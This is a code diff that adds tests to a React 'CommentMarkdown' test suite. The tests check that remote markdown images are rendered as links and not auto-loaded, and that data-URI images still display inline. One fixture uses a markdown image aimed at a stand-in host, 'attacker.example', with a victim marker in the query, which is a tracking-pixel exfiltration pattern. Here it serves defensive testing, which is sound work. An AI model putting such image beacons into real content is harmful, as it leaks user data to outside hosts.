@@ -89,6 +89,30 @@ describe('CommentMarkdown', () => {
     expect(markup).toContain('src="data:image/png;base64,abc123"')
   })
 
+  it('keeps remote document markdown images as links (no auto-fetch tracking pixel)', () => {
+    const markup = renderToStaticMarkup(
+      <CommentMarkdown
+        variant="document"
+        content="Body: ![x](http://attacker.example/p.png?v=VICTIM)"
+      />
+    )
+
+    expect(markup).not.toContain('<img')
+    expect(markup).toContain('href="http://attacker.example/p.png?v=VICTIM"')
+  })
+
+  it('renders trusted document markdown images inline', () => {
+    const markup = renderToStaticMarkup(
+      <CommentMarkdown
+        variant="document"
+        content="Shot: ![Image #1](data:image/png;base64,abc123)"
+      />
+    )
+
+    expect(markup).toContain('<img')
+    expect(markup).toContain('src="data:image/png;base64,abc123"')
+  })
+
   it('renders bare GitHub user attachment links as document videos', () => {
     const url = 'https://github.com/user-attachments/assets/ce11040a-fb66-4289-927f-547b16dfc488'
     const markup = renderToStaticMarkup(<CommentMarkdown variant="document" content={url} />)
